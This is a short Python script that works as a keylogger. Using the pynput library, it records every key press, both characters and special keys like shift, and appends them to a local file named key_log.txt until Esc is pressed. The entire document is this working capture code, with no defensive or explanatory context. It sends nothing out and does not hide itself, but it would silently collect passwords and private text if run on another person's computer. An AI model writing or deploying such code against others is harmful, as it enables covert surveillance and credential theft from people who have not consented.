from pynput import keyboard

# This variable will store the logged keys
keys = []

# Define a function to log each key press
def on_press(key):
    try:
        # Capture alphanumeric keys (normal characters)
        keys.append(str(key.char))
    except AttributeError:
        # Capture special keys (e.g., space, shift, etc.)
        keys.append(f'[{key}]')

    # Save the logged keys to a file every time a key is pressed
    with open("key_log.txt", "a") as log_file:
        log_file.write(''.join(keys))
        keys.clear()  # Clear the list after writing to the file

# Define a function to stop logging on a specific key press (like Esc)
def on_release(key):
    if key == keyboard.Key.esc:  # Stop the keylogger when 'Esc' is pressed
        return False

# Set up the keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()